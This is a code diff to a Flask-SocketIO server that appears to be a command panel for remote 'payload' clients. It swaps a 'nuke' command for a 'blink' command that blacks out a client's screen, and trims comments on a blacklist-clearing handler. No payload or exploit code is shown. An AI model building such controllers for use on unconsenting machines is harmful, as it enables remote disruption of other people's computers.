@@ -68,14 +68,15 @@ def delete_session(data):
             del sessions[sid]
             emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
 
-@socketio.on('nuke_session', namespace='/dashboard')
-def nuke_session(data):
+@socketio.on('blink_session', namespace='/dashboard')
+def blink_session(data):
+    """
+    Handles the 'BLINK' button. Sends command to black out screen for 3s.
+    """
     sid = data.get('session_id')
     if sid in sessions:
-        print(f"Server: Issuing NUKE to {sid}")
-        socketio.emit('command_nuke', {}, namespace='/payload', room=sid)
-        del sessions[sid]
-        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
+        print(f"Server: Issuing BLINK to {sid}")
+        socketio.emit('command_blink', {}, namespace='/payload', room=sid)
 
 @socketio.on('update_nametag', namespace='/dashboard')
 def update_nametag(data):
@@ -84,13 +85,8 @@ def update_nametag(data):
         sessions[sid]['nametag'] = data.get('nametag')
         emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
 
-# --- NEW EVENT HANDLER ---
 @socketio.on('clear_blacklist', namespace='/dashboard')
 def clear_blacklist(data):
-    """
-    Clears the server-side blacklist of session IDs.
-    Allows previously killed payloads to reconnect.
-    """
     print("Server: Received request to clear blacklist.")
     blacklist.clear()
     print("Server: Blacklist has been cleared.")
